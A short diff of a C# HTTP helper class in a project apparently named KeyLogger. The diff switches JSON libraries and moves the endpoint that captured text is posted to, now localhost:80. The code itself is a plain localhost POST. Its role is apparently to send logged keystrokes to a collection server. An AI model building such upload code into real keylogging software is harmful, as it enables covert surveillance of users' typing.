@@ -1,9 +1,9 @@
-﻿using Newtonsoft.Json;
-using System.Net.Http;
+﻿using System.Net.Http;
 using System.Text;
+using System.Text.Json;
 using System.Threading.Tasks;
 
-namespace KeyLogger
+namespace KeyLoggerAPP
 {
     public class ServiceHTTP
     {
@@ -12,13 +12,13 @@ namespace KeyLogger
             try
             {
                 HttpClient httpClient = new HttpClient();
-                httpClient.DefaultRequestHeaders.Add("X-ORIGIN", "APP1");
-                var response = await httpClient.PostAsync("http://localhost:35164/api/", new StringContent(JsonConvert.SerializeObject(text), Encoding.UTF8, "application/json"));
+                httpClient.DefaultRequestHeaders.Add("X-ORIGIN", "APP2");
+                var response = await httpClient.PostAsync("http://localhost:80/api/", new StringContent(JsonSerializer.Serialize(text), Encoding.UTF8, "application/json"));
 
                 return response.IsSuccessStatusCode;
             }
             catch
-            {}
+            { }
 
             return false;
         }
